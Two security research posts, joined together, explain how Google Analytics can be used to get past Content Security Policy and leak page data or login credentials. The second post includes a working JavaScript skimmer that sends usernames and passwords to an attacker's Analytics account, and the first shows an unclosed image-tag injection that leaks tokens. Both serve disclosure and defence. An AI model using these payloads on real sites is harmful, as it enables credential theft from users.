
Bypassing CSP with Google Analytics

##
#
https://labs.detectify.com/how-to/using-google-analytics-for-data-extraction/
#
https://hackerone.com/reports/199779
#
https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp
#
##

Linus Särud
Jan 19, 2018
Twitter
LinkedIn

Our security researcher and Detectify Crowdsource hacker Linus Särud explains how he bypassed CSP with Google Analytics.
Bypassing CSP with Google Analytics
SP

CSP stands for Content Security Policy and allows a website developer to control what origins the website is allowed to load resources from. Using CSP makes it possible to determine what locations images can be loaded from, if inline-scripts are allowed, and so forth.

If configured to only allow resources and JavaScript to be loaded from a certain location, CSP can greatly limit the impact of an XSS as the attacker is not able to execute JavaScript or load their own external resources.
Google Analytics

Google Analytics works by loading a tiny image from their domain. As such, the CSP policy does allow images to load from www.google-analytics.com. This is not the only way to configure Google Analytics, but it seems to be the most common one.

Google Analytics can be used to track all kinds of things and one of their features is called events. To quote their support page:

Events are user interactions with content that can be tracked independently from a web page or a screen load. Downloads, mobile ad clicks, gadgets, Flash elements, AJAX embedded elements, and video plays are all examples of actions you might want to track as Events.
https://support.google.com/analytics/answer/1033068

Events can be submitted to Google Analytics by loading a URL that includes a URL parameter for the event value. A common use case would be to include this image in emails, so as soon as the email is opened an event request is sent to Google Analytics with the value ‘opened‘.

A code snippet of that could look like this:

<img src=”https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=opened”>

As this image can be used in so many different ways Google does no validation of the URL it is loaded from. Even if the link is connected to abc.com’s Analytics account, it can be published on xyz.com and work just fine.
The issue

About a year ago Github (with help from Cure53) decided to investigate their own CSP policy. They published all their findings on their blog, and we chose to focus on one of the things brought up there.

If an attacker finds an HTML injection on your website and you allow Google Analytics in the CSP, they are able to inject an image making an event request to Google Analytics similar to what we described earlier.

This becomes a potential issue when you consider what happens if we do not close the image tag.

If a legit request looks like this:

<img src=’https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=test’>

Imagine if we injected this:

<img src=’https://www.google-analytics.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=test

(compared to the first code snippet, this lacks the last few characters)

The browser will understand it as a picture, and take everything until the next quote in the code as part of the URL. This will all be sent to the attacker, who can login to their Google Analytics account and see the results.
Impact
Tokens or user data

The most common issue occurs if the code sent to attackers includes CSRF tokens, or personal information in general.

To understand the issue better, imagine that we got this awesome service that you need an invite to register for, the code would look like this:

Now, the CSP is so strict that the only thing we can do is inject HTML (no JavaScript) but also load images from google-analytics.com. We simply inject a non-closed img-tag to google-analytics.com, so it looks like this:

We can use the developer tools in Firefox to confirm that the request did indeed include the token.

Bug Bounties

For those out there doing bug bounties, techniques like these could increase the award as you have proved some real impact and are not getting blocked due to CSP.

With that said, before sending mass reports to everyone, read up whether CSP issues are in scope! Many do not consider CSP bypasses themselves as in scope, while others do. HackerOne has paid bounty for this and Github explicitly invites researcher to break their CSP-policy.
Mitigations

To fix the Google Analytics issue, change from using image requests to instead using XHR requests. After doing this, you can safely remove Google Analytics from the img-src in the CSP policy.

As for the bigger picture, look at every service included in the CSP policy and think what could be done to exploit it. Can information somehow be submitted to it, that can then be read by the hacker? Also, try to limit the amount of third parties included as much as possible.

Chrome has taken additional steps to protect against this by blocking requests that contain both a newline and typical HTML characters. However, such protections do not exist in FireFox or Safari so it is still possible to exploit.
Takeaway

Realising how all the services you use can be abused is hard. The general recommendation is to keep the number of trusted external parties as low as possible and be somewhat strict about it, but even that is not always enough. For example, most would not think twice about adding Google Analytics.

This issue is one of the many security flaws that Detectify checks for, so run a scan now! We keep up with all the strange new security tricks so that you can focus on development.
Join Detectify Crowdsource

Linus reported this issue through Detectify Crowdsource, our ethical hacking platform. If you’re a security researcher and want to join Linus and over 100 other ethical hackers, sign up and become part of the community! Crowdsource hackers receive monetary rewards for their submissions, so what are you waiting for? Join the Crowdsource community
Additional readings

```
http://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf
```

##
##


Exfiltrating User’s Private Data Using Google Analytics to Bypass CSP
By Amir Shaked
Jun 17, 2020
Technology and Engineering
An Open Window to Exfiltrate Data

CSP can define a list of domains that the browser should be allowed to interact with for the visited URL. Designed to guard against XSS attacks, CSP helps control which domains can be accessed as part of a page and therefore restricts which domains to share data with. It even can restrict forms to be sent only to specific hosts, using the form-action directive. These restrictions are specified by a list of allowed URIs. Unfortunately, the path matching algorithm used ignores query strings.

As is often the case, an embedded third-party service that identifies its user’s account using a query string can’t be restricted to a given account. By analyzing field data we see a gap in the implementation of CSP, and even for sites that do use it correctly, this creates an open window to exfiltrate data. Our demonstration shows how using the Google Analytics API, a web skimmer can send data to be collected in his own account instance. As Google Analytics is allowed in the CSP configuration of many major sites, this demo shows how an attacker can bypass this security protection and steal data.
CSP Usage Statistics

Our gathered field data shows the following statistics on CSP usage across the Internet (based on HTTPArchive March 2020 scan):

Looking at the top 3M domains, only 210K use CSP. Out of these:

    17K allow google-analytics domain (inc. all variations)

    Most don’t even do much besides
        upgrade-insecure-requests
        frame-ancestors
        frame-src
        block-all-mixed-content

Since the most common allowed domain is google-analytics.com (17K websites) it was the natural candidate to test our theory. So let’s dive in and see what can be done with that.
Demo of the Attack

In our demonstration, using a simple mechanism, we can leak data over commonly allowed third-party domains. We took google-analytics as an example, but other services can also be used.

As an example, we took the twitter login page, which implemented the following CSP rule (which contains https://www.google-analytics.com):

Image 16

The following short JS code inserted into the site will send the credentials to google-analytics console controlled by us:

username = document.getElementsByName("session[username_or_email]");
password = document.getElementsByName('session[password]');
window.addEventListener("unload", function logData() {
       navigator.sendBeacon("https://www.google-analytics.com/collect",
       'v=1&t=pageview&tid=UA-#######-#&cid=555&dh=perimeterx.com&dp=%2F'+
       btoa(username.item(0).value +':'+ password.item(0).value) +'&dt=homepage');
});

The UA-#######-# parameter is the tag ID owner that Google Analytics uses to connect the data to a specific account. Instead of using twitter’s google-analytic account, we used an account we control. Unfortunately, the CSP policy can’t discriminate based on the Tag ID. This will allow the dp parameter to be sent to our account. Though Google meant to have this parameter be used to mention the page the user visited, we used it to exfiltrate the user name and password data encoded in base64.

In our Google Analytics platform, we will see the data as:

Image 17

In our demo the DP will result in page view of bmV3ZW1haWxAcGVyaW1ldGVyeC5jb206bmV3cGFzcw== Which will be decoded from base64 as: "newemail@perimeterx.com:newpass"

The source of the problem is that the CSP rule system isn’t granular enough. Recognizing and stopping the above malicious JavaScript request requires advanced visibility solutions that can detect the access and exfiltration of sensitive user data (in this case the user’s email address and password).

One might think we could have updated the CSP to only allow specific TIDs: 'connect-src https://www.google-analytics.com/r/collect?*tid=[SPECIFIC_ACCOUNT]'.

The problem is that CSP doesn't support query strings (See Spec):

    Note: Query strings have no impact on matching: the source expression example.com/file matches all of https://example.com/file, https://example.com/file?key=value, https://example.com/file?key=notvalue, and https://example.com/file?notkey=notvalue.
